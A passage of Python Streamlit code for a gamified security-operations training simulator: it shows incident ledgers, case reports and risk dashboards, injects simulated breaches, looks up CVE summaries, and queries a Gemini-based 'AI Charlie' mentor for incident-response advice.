                    st.error(f"MISSION FAILED: {latest.get('DistractorExplanations', {}).get(action, 'Incorrect protocol.')}")

    if st.button("ABORT ANALYSIS", use_container_width=True):
        st.session_state.remediation_target = None
        st.session_state.remediation_step = 1
        st.rerun()


def render_case_profile(case_data):
    """Detailed Case View: Post-playbook analysis and documentation."""
    st.markdown(f"## CASE ARCHIVE: {case_data.get('ID')}")
    
    st.markdown(f"""
        <div style="padding: 20px; border: 2px solid #00FF00; background: rgba(0, 20, 0, 0.95); border-radius: 8px;">
            <h2 style="color: #00FF00; font-family: monospace;">STATUS: REMEDIATED // PENDING 8. FINAL REPORT</h2>
            <div style="display: flex; gap: 40px; margin-top: 30px; flex-wrap: wrap;">
                <div style="flex: 1; min-width: 300px;">
                    <h3 style="color: #00FF00;">INCIDENT DESCRIPTION</h3>
                    <p style="color: #FFFFFF; font-size: 0.95rem; line-height: 1.6;">{case_data.get('Insight')}</p>
                    <h3 style="color: #00FF00; margin-top: 20px;">TECHNICAL FIELD STEPS</h3>
                    <p style="color: #AAAAAA; font-family: monospace;">{" | ".join(case_data.get('Steps', [])) if isinstance(case_data.get('Steps'), list) else 'Protocol record empty.'}</p>
                </div>
                <div style="width: 300px; border-left: 1px solid rgba(255,255,255,0.1); padding-left: 30px;">
                    <h4 style="color: #00FF00;">FORENSIC METADATA</h4>
                    <p style="color: #FFFFFF; font-size: 0.8rem;"><b>VECTOR:</b> {case_data.get('Vector')}</p>
                    <p style="color: #FFFFFF; font-size: 0.8rem;"><b>CVE:</b> {case_data.get('CVE')}</p>
                    <p style="color: #FFFFFF; font-size: 0.8rem;"><b>MITRE:</b> {case_data.get('MITRE')}</p>
                    <p style="color: #FFFFFF; font-size: 0.8rem;"><b>REGION:</b> LAT: {case_data.get('lat')}, LON: {case_data.get('lon')}</p>
                </div>
            </div>
        </div>
    """, unsafe_allow_html=True)
    
    st.divider()
    st.subheader("Step 8: Final Forensic Incident Report")
    st.info(f"Complete the required documentation for a {case_data.get('Vector')} incident.")
    
    questions = case_data.get('ReportQuestions', ["General Summary of the event:", "Technical steps taken:", "Lessons learned:"])
    user_answers = []
    for i, q in enumerate(questions):
        ans = st.text_area(f"FIELD NOTE: {q}", height=100, key=f"ans_{case_data['ID']}_{i}", placeholder="Document evidence...")
        user_answers.append(f"Q: {q}\nA: {ans}")

    user_report = "\n\n".join(user_answers)

    if st.button("SUBMIT REPORT FOR AI EVALUATION", type="primary"):
        if len(user_report) < 20:
            st.warning("Report too brief. Please provide more tactical detail for Mastery XP.")
        else:
            with st.spinner("AI Charlie is reviewing your documentation..."):
                context = f"Incident: {case_data.get('Vector')}. Student Report: {user_report}"
                feedback = ask_ai_charlie("Review this incident report. Did they cover containment and remediation? Give personalized feedback.", context)
                st.session_state.ai_report_feedback = feedback
                st.rerun()

    if 'ai_report_feedback' in st.session_state:
        st.markdown(f"""<div style='background:rgba(0,255,0,0.05); padding:20px; border-left:4px solid #00FF00; margin-top:20px;'>
            <b style='color:#00FF00;'>🤖 AI CHARLIE'S EVALUATION:</b><br><br>{st.session_state.ai_report_feedback}</div>""", unsafe_allow_html=True)

    st.write("")
    if st.button("← RETURN TO COMMAND CENTER", type="primary"):
        st.session_state.points += 10
        st.session_state.threat_log = [t for t in st.session_state.threat_log if t.get('ID') != case_data.get('ID')]
        st.session_state.active_case = None
        if 'ai_report_feedback' in st.session_state: del st.session_state.ai_report_feedback
        st.rerun()


def ask_ai_charlie(query, threat_context=None):
    try:
        api_key = st.session_state.get('gemini_api_key')
        if not api_key:
            return "AI Charlie's neural link is offline. (Missing API Key)"

        client = genai.Client(api_key=api_key)
        prompt = f"You are AI Charlie, a Senior SOC Lead and Mentor. Guide the student through the incident context: {threat_context} following NIST SP 800-61 Rev. 2 standards. Student query: {query}. Provide technical, concise advice and explain the 'why' based on core security principles."
        
        response = client.models.generate_content(
            model='gemini-3.5-flash',
            contents=prompt
        )
        return response.text
    except Exception as e:
        error_msg = str(e)
        if "429" in error_msg:
            return "Neural Link Error: API Quota exceeded. Please wait a moment before trying again."
        if "API_KEY_INVALID" in error_msg:
            return "Neural Link Error: The provided API Key is invalid or expired."
        if "User location is not supported" in error_msg:
            return "Neural Link Error: Gemini API is not available in your current region."
        if "quota" in error_msg.lower():
            return "Neural Link Error: API Quota exceeded. Please verify your billing/usage limits."
        return "Neural Link Error: Unable to establish connection to AI Charlie. Check network or API quotas."


def fetch_cve_details(cve_id: str) -> str:
    """Fetches live summary data for a specific CVE from the CIRCL API."""
    if not cve_id or "CVE-" not in cve_id.upper() or "XXXXX" in cve_id:
        return "No valid CVE identifier found for this threat vector."
    
    try:
        # Using CIRCL API for quick, no-auth access in the demo environment
        api_url = f"https://cve.circl.lu/api/cve/{cve_id}"
        with urlopen(api_url, timeout=5) as response:
            data = json.loads(response.read().decode())
            if data and "summary" in data:
                return data["summary"]
            return "CVE details found in database, but no summary payload was returned."
    except Exception as e:
        if "404" in str(e):
            return f"Intelligence for {cve_id} is not yet available in the external database."
        return f"Live Intel Fetch Failed: {str(e)}"


def render_user_profile() -> None:
    if 'user_profile' not in st.session_state:
        st.session_state.user_profile = None

    # Username signup process hidden per Commander's request. 
    # Defaulting to active telemetry mode.
    if not st.session_state.user_profile:
        st.sidebar.markdown("<p style='color: #777777; font-size: 0.6rem; margin-bottom: 20px;'>// ANONYMOUS COMMANDER MODE</p>", unsafe_allow_html=True)

    # Tactical XP Progress Tracking
    points = st.session_state.get('points', 0)
    xp_to_next = 100 - (points % 100)
    st.sidebar.markdown(f"""
        <div style='margin-bottom:15px;'>
            <span style='color:#777777; font-size:0.6rem;'>XP PROGRESS TO NEXT RANK</span>
            <div style='background:#111; border:1px solid #00FF00; height:8px; width:100%;'>
                <div style='background:#00FF00; height:100%; width:{points % 100}%;'></div>
            </div>
            <span style='color:#00FF00; font-size:0.6rem;'>{points} XP Total | {xp_to_next} XP needed</span>
        </div>
    """, unsafe_allow_html=True)

    if st.session_state.user_profile:
        profile = st.session_state.user_profile
        st.sidebar.markdown(f"""
            <div style="border: 1px solid #00FF00; padding: 10px; background: rgba(0,255,0,0.05); margin-bottom: 20px;">
                <b style="color:#00FF00;">OFFICER: {profile['username'].upper()}</b><br>
                <span style="font-size:0.7rem;">TRACK: {profile['track']}</span><br>
                <span style="font-size:0.7rem;">ENLISTED: {profile['started_at']}</span>
            </div>
        """, unsafe_allow_html=True)


def render_ai_analyst() -> None:
    ranks = [
        "◈ SENTINEL INITIATE (L1)", "◆ VECTOR OPERATOR (L2)", 
        "❖ PROTOCOL ANALYST (L3)", "⌘ CORE RESPONDER (PRO)", 
        "⫸ INCIDENT COMMANDER (EXPERT)", "⌬ SYSTEMS ARCHITECT (MASTER)", 
        "🌐 DIGITAL SOVEREIGN (SME)"
    ]
    points = st.session_state.get('points', 0)
    current_rank = ranks[min(points // 20, len(ranks)-1)]

    threat_log = st.session_state.get("threat_log", []) or []
    if not threat_log or not isinstance(threat_log[0], dict):
        st.sidebar.markdown('<div class="analyst-terminal">> SYSTEM SECURE.<br>> NO ACTIVE THREATS.</div>', unsafe_allow_html=True)
        return

    latest = threat_log[0]
    
    if st.session_state.show_intel and latest:
        mitre_id = latest.get('MITRE', '')
        
        if st.session_state.get('last_mitre_id') != mitre_id:
            st.session_state.intel_summary = ""
            st.session_state.last_mitre_id = mitre_id

        if not st.session_state.get('intel_summary') and "T" in mitre_id:
            summary_prompt = f"Briefly summarize MITRE technique {mitre_id}. Provide one sentence on what it is, one on detection, and one on mitigation."
            st.session_state.intel_summary = ask_ai_charlie(summary_prompt, mitre_id)

        mitre_url_path = mitre_id.replace(".", "/")
        mitre_link = f"<a href='https://attack.mitre.org/techniques/{mitre_url_path}/' target='_blank' style='color:#00FF00;'>MITRE: {mitre_id}</a>" if "T" in mitre_id else mitre_id
        
        summary = st.session_state.get('intel_summary', 'No summary available.')
        intel_text = f"<br><br>> AI CHARLIE: Intel Summary for {mitre_link}:<br>> {summary}"
    else:
        intel_text = ""
    
    chat_display = ""
    for chat in st.session_state.chat_history[-2:]:
        chat_display += f"<br>> 👤 Student: {chat['user']}<br>> 🤖 Charlie: {chat['ai']}<br>"

    hint_text = f"<br><br>> [HINT]: {latest.get('Hint')}" if st.session_state.show_hint else ""
    error_text = f"<br><br><span style='color:#FF4B4B;'>[ERROR]: {st.session_state.last_error}</span>" if st.session_state.last_error else ""

    api_key = st.session_state.get('gemini_api_key')
    link_status = "<span style='color:#00FF00;'>ONLINE</span>" if api_key else "<span style='color:#FF4B4B;'>OFFLINE (MISSING KEY)</span>"

    st.sidebar.markdown(f"""
    <div class="analyst-terminal">
            > INITIALIZING AI CHARLIE ANALYST...<br>
        > RANK: {current_rank}<br>
        > NEURAL LINK: {link_status}<br>
        > SCORE: {st.session_state.points} XP<br>
        -------------------------<br>
            > 🤖 AI CHARLIE: Commander, {latest.get('Vector', 'Alert')} detected.<br><br>
        > LOG: "{latest.get('Insight')}"{intel_text}{hint_text}{error_text}{chat_display}<br><br>
        > ADVISORY: Ask me anything or execute protocol.
    </div>
    """, unsafe_allow_html=True)

    st.sidebar.text_input(
        "🔗 Neural Link (Gemini API Key):", 
        type="password", 
        key="gemini_api_key",
        help="Get a free key from https://aistudio.google.com/app/apikey"
    )

    def handle_chat():
        query = st.session_state.ai_chat_input
        if query:
            forensics = latest.get('Forensics', {})
            enriched_context = f"Vector: {latest.get('Vector')}, Evidence: {json.dumps(forensics)}"
            
            ai_resp = ask_ai_charlie(query, enriched_context)
            st.session_state.chat_history.append({"user": query, "ai": ai_resp})
            st.session_state.ai_chat_input = ""

    st.sidebar.text_input("NEURAL LINK CMD:", key="ai_chat_input", on_change=handle_chat, placeholder="Ask Charlie...")
    
    if not api_key:
        st.sidebar.warning("⚠️ Neural Link Key Missing. Connect via Secrets or Sidebar.")
    else:
        if st.sidebar.button("⚡ TEST NEURAL LINK", use_container_width=True):
            with st.sidebar:
                with st.spinner("Testing Link..."):
                    test_resp = ask_ai_charlie("Perform a short systems check. Are you online?")
                    if "Error" in test_resp:
                        st.error(test_resp)
                    else:
                        st.success("Handshake Successful: AI Charlie is Responsive.")

    col_a, col_b = st.sidebar.columns(2)
    if col_a.button("📡 INTEL", key="intel_btn", use_container_width=True):
        st.session_state.show_intel = not st.session_state.show_intel; st.rerun()
    if col_b.button("💡 HINT", key="hint_btn", use_container_width=True):
        st.session_state.show_hint = not st.session_state.show_hint; st.rerun()

    with st.sidebar.expander("🔍 CVE THREAT INTEL", expanded=False):
        cve_id = latest.get('CVE', 'N/A')
        if cve_id != 'N/A' and "XXXXX" not in cve_id:
            if st.session_state.get('last_cve_id') != cve_id:
                st.session_state.cve_intel = fetch_cve_details(cve_id)
                st.session_state.last_cve_id = cve_id
            st.markdown(f"<p style='color:#00FF00; font-size:0.8rem; font-weight:bold;'>{cve_id}</p>", unsafe_allow_html=True)
            st.markdown(f"<p style='color:#FFFFFF; font-size:0.75rem; line-height:1.4;'>{st.session_state.get('cve_intel')}</p>", unsafe_allow_html=True)
        else:
            st.write("No external CVE associated with this vector.")

    for action in latest.get('Playbook', []):
        if st.sidebar.button(f"EXECUTE: {action}", key=f"act_{latest['ID']}_{action}", use_container_width=True):
            if action == latest.get('Correct'):
                st.session_state.points += 10
                st.session_state.threat_log.pop(0)
                st.session_state.intel_summary = ""
                st.session_state.last_mitre_id = ""
                st.session_state.show_intel = False; st.session_state.show_hint = False; st.session_state.last_error = ""
                st.session_state.assets_count += random.randint(1, 10)
                s_list = latest.get('Steps', [])
                
                steps = "\n".join(s_list) if isinstance(s_list, list) else "Protocol details unavailable."
                st.sidebar.success(f"CORRECT.\n\nFIELD STEPS:\n{steps}")
                st.rerun()
            else:
                st.session_state.last_error = latest.get('DistractorExplanations', {}).get(action, "Incorrect protocol selection.")
                st.rerun()


def render_incident_ledger() -> None:
    st.markdown("<p style='color: #FFFFFF; margin: 40px 0 10px 0; font-size: 0.7rem; letter-spacing: 2px;'>// MASTER INCIDENT LEDGER</p>", unsafe_allow_html=True)
    threat_log = st.session_state.get("threat_log", []) or []
    
    # Apply SIEM analytics filter from the distribution chart
    if st.session_state.get("severity_filter"):
        threat_log = [t for t in threat_log if t.get('Severity') == st.session_state.severity_filter]
        st.markdown(f"<p style='color: #00FF00; font-size: 0.7rem; margin-top: -15px;'>// FILTERED VIEW: {st.session_state.severity_filter.upper()} SEVERITY</p>", unsafe_allow_html=True)

    st.markdown("<hr style='border: 0; border-top: 1px solid rgba(255,255,255,0.05); margin: 20px 0;'>", unsafe_allow_html=True)

    if not threat_log:
        st.markdown("<p style='color: #444444; font-size: 0.8rem; font-family: monospace;'>[SYSTEM MESSAGE]: LEDGER EMPTY. NO CURRENT INCIDENTS RECORDED.</p>", unsafe_allow_html=True)
        return

    header_cols = st.columns([1, 1, 1, 3, 1, 1])
    cols_meta = ["TIMESTAMP", "SEVERITY", "ID", "VECTOR", "MITRE", "ACTION"]
    for col, label in zip(header_cols, cols_meta):
        col.markdown(f"<span style='color: #00FF00; font-size: 0.7rem; font-weight: bold;'>{label}</span>", unsafe_allow_html=True)

    st.markdown("<hr style='border: 0; border-top: 1px solid rgba(0,255,0,0.2); margin: 5px 0 15px 0;'>", unsafe_allow_html=True)

    for t in threat_log:
        row_cols = st.columns([1, 1, 1, 3, 1, 1])
        sev = t.get("Severity", "Low").upper()
        color = "#00FF00" if sev == "CRITICAL" else "#FFFFFF" if sev == "HIGH" else "#777777"
        
        row_cols[0].markdown(f"<span style='color: #777777; font-size: 0.75rem; font-family: monospace;'>{t.get('Time')}</span>", unsafe_allow_html=True)
        row_cols[1].markdown(f"<span style='color: {color}; font-size: 0.75rem; font-weight: bold; font-family: monospace;'>{sev}</span>", unsafe_allow_html=True)
        row_cols[2].markdown(f"<span style='color: #FFFFFF; font-size: 0.75rem; font-family: monospace;'>{t.get('ID')}</span>", unsafe_allow_html=True)
        row_cols[3].markdown(f"<span style='color: #FFFFFF; font-size: 0.75rem; font-family: monospace;'>{t.get('Vector')}</span>", unsafe_allow_html=True)
        row_cols[4].markdown(f"<span style='color: #777777; font-size: 0.75rem; font-family: monospace;'>{t.get('MITRE')}</span>", unsafe_allow_html=True)
        
        if row_cols[5].button("OPEN", key=f"ledger_btn_{t.get('ID')}", use_container_width=True):
            st.session_state.remediation_target = t
            st.rerun()


def render_risk_dashboard() -> None:
    """Aggregated risk assessment mirroring Chronicle/Splunk SOC views."""
    st.markdown("<p style='color: #FFFFFF; margin: 0 0 10px 0; font-size: 0.7rem; letter-spacing: 2px;'>// COMMAND RISK ASSESSMENT</p>", unsafe_allow_html=True)
    threat_log = st.session_state.get("threat_log", []) or []
    critical_count = len([t for t in threat_log if t.get('Severity') == 'Critical'])
    
    # Dynamic Scoring Logic
    system_risk = min(100, (len(threat_log) * 5) + (critical_count * 20))
    user_risk = 12 # Mocked baseline
    entity_risk = critical_count * 15
    
    r1, r2, r3 = st.columns(3)
    with r1:
        st.markdown(f'<div class="risk-metric-card"><div class="risk-label">System Risk</div><div class="risk-value" style="color:{"#FF4B4B" if system_risk > 50 else "#00FF00"}">{system_risk}</div></div>', unsafe_allow_html=True)
    with r2:
        st.markdown(f'<div class="risk-metric-card"><div class="risk-label">User Entity Risk</div><div class="risk-value">{user_risk}</div></div>', unsafe_allow_html=True)
    with r3:
        st.markdown(f'<div class="risk-metric-card"><div class="risk-label">Threat Velocity</div><div class="risk-value">{entity_risk}</div></div>', unsafe_allow_html=True)


def render_global_intel() -> None:
    st.markdown("<p style='color: #FFFFFF; margin: 25px 0 10px 0; font-size: 0.7rem; letter-spacing: 2px;'>// GLOBAL THREAT INTELLIGENCE</p>", unsafe_allow_html=True)
    intel_feed = fetch_global_intel_feed()
    for intel in intel_feed:
        color = "#FF4B4B" if intel['severity'] == "Critical" else "#00FF00"
        st.markdown(f"""
            <div style="background: rgba(255,255,255,0.02); padding: 10px; border-left: 2px solid {color}; margin-bottom: 5px;">
                <span style="font-size: 0.6rem; color: {color}; font-weight: bold;">{intel['source']}</span><br>
                <a href="{intel['url']}" target="_blank" style="text-decoration:none; color: #FFFFFF; font-size: 0.75rem;">{intel['title']}</a>
            </div>
        """, unsafe_allow_html=True)


def render_pipeline_status() -> None:
    pipelines = get_pipeline_status_data()
    for _, row in pipelines.iterrows():
        card_html = f'<div class="pipeline-card"><div class="pipeline-name">{row["Pipeline"]}</div><div style="color:#00FF00;font-size:0.75rem;font-weight:bold;margin-top:4px;">● SECURE</div></div>'
        st.markdown(card_html, unsafe_allow_html=True)


def initialize_session_state() -> None:
    defaults = {
        "threat_log": [],
        "threat_count": 0,
        "intel_summary": "",
        "last_mitre_id": "",
        "cve_intel": "",
        "last_cve_id": "",
        "assets_count": 0,
        "points": 0,
        "prev_rank_idx": 0,
        "last_error": "",
        "last_auto_injection": time.time(),
        "show_intel_feed": False,
        "chat_history": [],
        "show_intel": False,
        "show_hint": False,
        "next_interval": 10,
        "auto_step": 0,
        "breach_sim_active": False,
        "remediation_step": 1,
        "threat_timeline": [],
        "remediation_target": None,
        "active_case": None,
        "gemini_api_key": st.secrets.get("GEMINI_API_KEY", ""),
        "user_profile": None,
        "severity_filter": None,
        "aws_credentials_warning_shown": False # Track if AWS warning has been shown
    }
    for key, val in defaults.items():
        if key not in st.session_state:
            st.session_state[key] = val


def main() -> None:
    initialize_session_state()
    perform_system_hygiene()

    # Unified AWS Credential check outside of cached functions
    if "AWS_ACCESS_KEY_ID" not in st.secrets and not st.session_state.get('aws_credentials_warning_shown', False):
        st.sidebar.warning("⚠️ AWS Neural Link Offline: Using Local Telemetry.")
        st.session_state.aws_credentials_warning_shown = True

    if st.session_state.remediation_target:
        remediation_dialog(st.session_state.remediation_target)

    if st.session_state.active_case:
        render_header(st.session_state.threat_count, st.session_state.assets_count)
        render_case_profile(st.session_state.active_case)
        st.stop()

    with st.sidebar:
        st.markdown("<p style='color: #FFFFFF; font-size: 0.7rem; letter-spacing: 1px;'>// TACTICAL SIMULATION</p>", unsafe_allow_html=True)
        breach_sim = st.toggle("SIMULATE SYSTEM BREACH", value=False)

        if breach_sim and not st.session_state.breach_sim_active:
            st.session_state.last_auto_injection = time.time()
            st.session_state.next_interval = 10
            st.session_state.auto_step = 0
            st.session_state.breach_sim_active = True
        elif not breach_sim:
            st.session_state.breach_sim_active = False

        if breach_sim:
            current_time = time.time()
            elapsed = current_time - st.session_state.last_auto_injection
            remaining = max(0, int(st.session_state.next_interval - elapsed))
            mins, secs = divmod(remaining, 60)
            
            countdown_html = f'<div style="border:1px solid #00FF00;padding:10px;margin-bottom:20px;text-align:center;background:rgba(0,255,0,0.05);"><span style="color:#00FF00;font-size:0.65rem;letter-spacing:1px;">T-MINUS NEXT BREACH</span><br><span style="color:#FFFFFF;font-size:1.4rem;font-family:monospace;">{mins:02d}:{secs:02d}</span></div>'
            st.markdown(countdown_html, unsafe_allow_html=True)

            if elapsed >= st.session_state.next_interval:
                pool = get_active_threats_data()
                
                # Adaptive Logic: Escalate based on XP/Points
                points = st.session_state.get('points', 0)
                if points < 30:
                    candidates = pool[pool['Severity'] == 'Low']
                elif points < 60:
                    candidates = pool[pool['Severity'].isin(['Low', 'Medium'])]
                elif points < 100:
                    candidates = pool[pool['Severity'].isin(['Medium', 'High'])]
                else:
                    candidates = pool[pool['Severity'] == 'Critical']
                
                if candidates.empty:
                    candidates = pool

                if candidates.empty:
                    st.error("Simulation Failure: No available threat patterns found.")
                    return

                new_threat = candidates.sample(1).iloc[0].to_dict().copy()
                new_threat["ID"] = f"TR-AUTO-{random.randint(1000, 9999)}"
                now = datetime.now(ZoneInfo("Europe/Berlin"))
                new_threat["Time"] = now.strftime("%H:%M:%S")
                st.session_state.threat_log = [new_threat] + st.session_state.threat_log[:9]
                st.session_state.threat_count += 1
                st.session_state.assets_count += random.randint(10, 100)
                st.session_state.threat_timeline.append(now)
                st.session_state.last_auto_injection = current_time
                st.session_state.next_interval = 60
                st.session_state.auto_step += 1
                st.rerun()

        st.session_state.show_intel_feed = st.checkbox("OPEN SIEM INTELLIGENCE FEED", value=st.session_state.show_intel_feed)

        if st.button("INJECT DETECTION EVENT"):
            new_threat = random.choice(get_active_threats_data().to_dict('records')).copy()
            new_threat["ID"] = f"TR-{random.randint(2000, 9999)}"
            now = datetime.now(ZoneInfo("Europe/Berlin"))
            new_threat["Time"] = now.strftime("%H:%M:%S")
            st.session_state.threat_log = [new_threat] + st.session_state.threat_log[:9]
            st.session_state.threat_count += 1
            st.session_state.assets_count += random.randint(5, 50)
            st.session_state.threat_timeline.append(now)
            st.rerun()

        st.markdown("<br><br><br><br>", unsafe_allow_html=True)
        st.markdown("<div style='border-top:1px solid rgba(255,255,255,0.1);padding-top:10px;'><p style='color: #555555; font-size: 0.6rem; line-height: 1.2;'>// GDPR COMPLIANCE: THIS SYSTEM PROCESSES TEMPORARY IP DATA FOR GEOSPATIAL PROJECTION. DATA IS VOLATILE AND NOT PERSISTED BEYOND THE ACTIVE SESSION. [ FRAMEWORK VERSION 1.0 ]</p></div>", unsafe_allow_html=True)

    threat_log = st.session_state.get('threat_log', []) or []
    latest_critical = next((t for t in threat_log if t.get("Severity") == "Critical"), None)
    active_breach_mode = breach_sim or (latest_critical is not None)

    inject_custom_css(breach_active=active_breach_mode)
    render_header(st.session_state.threat_count, st.session_state.assets_count)

    render_user_profile()
    render_risk_dashboard()

    # SIEM NAVIGATION TABS
    tab_ops, tab_blog = st.tabs(["🛡️ COMMAND CENTER", "📰 INTEL BLOG"])

    with tab_ops:
        if st.session_state.get('show_intel_feed') and threat_log:
            latest = threat_log[0]
            st.markdown(f"""
                <div style="background: rgba(0, 40, 0, 0.85); border: 2px solid #00FF00; padding: 20px; border-radius: 5px; margin-bottom: 25px; backdrop-filter: blur(10px);">
                    <h3 style="color: #00FF00; margin: 0 0 10px 0;">📡 SIEM INTELLIGENCE FEED: {latest.get('ID')}</h3>
                    <p style="color: #FFFFFF; font-size: 0.9rem;"><b>Vector:</b> {latest.get('Vector')} | <b>Source:</b> {latest.get('Source')} | <b>Status:</b> {latest.get('Status')}</p>
                    <p style="color: #AAAAAA; font-size: 0.85rem; border-top: 1px solid rgba(0,255,0,0.2); padding-top: 10px;">{latest.get('Insight')}</p>
                </div>
            """, unsafe_allow_html=True)

        map_lat, map_lon = None, None
        if active_breach_mode and latest_critical:
            map_lat, map_lon = latest_critical['lat'], latest_critical['lon']
        
        col_left, col_center, col_right = st.columns([1.2, 1.2, 4])
        
        with col_left:
            render_active_threats()
            
        with col_center:
            render_pipeline_status()
            
        with col_right:
            render_anomaly_map(zoom_lat=map_lat, zoom_lon=map_lon)
            chart_col1, chart_col2 = st.columns(2)
            with chart_col1: render_threat_distribution()
            with chart_col2: render_threat_velocity()

        st.divider()
        render_ai_engine_telemetry()
        render_ai_analyst()
        render_incident_ledger()

    with tab_blog:
        render_global_intel()

    if breach_sim:
        time.sleep(1)
        st.rerun()


if __name__ == "__main__":
    # Ensure main() is the entry point to guarantee state initialization
    main()
